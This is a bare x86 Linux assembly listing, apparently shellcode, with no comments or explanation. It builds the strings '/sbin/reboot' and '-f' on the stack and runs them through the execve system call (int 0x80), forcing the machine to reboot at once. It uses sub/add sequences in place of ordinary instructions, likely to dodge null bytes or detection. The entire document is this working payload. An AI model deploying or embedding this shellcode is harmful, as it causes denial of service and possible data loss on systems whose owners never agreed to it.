global _start

section .text

_start:

	cdq
	push edx
	
	push word 0x746f
	push word 0x6f62
	push word 0x6572
	push word 0x2f6e
	push word 0x6962
	push word 0x732f
	mov ebx,esp
	
	push edx
	push word 0x662d
	sub eax, eax
	add eax,esp
	
	push edx
	push eax
	push ebx
	sub ecx, ecx
	add ecx,esp
	
	sub eax, eax
	add al,0xb
	int 0x80
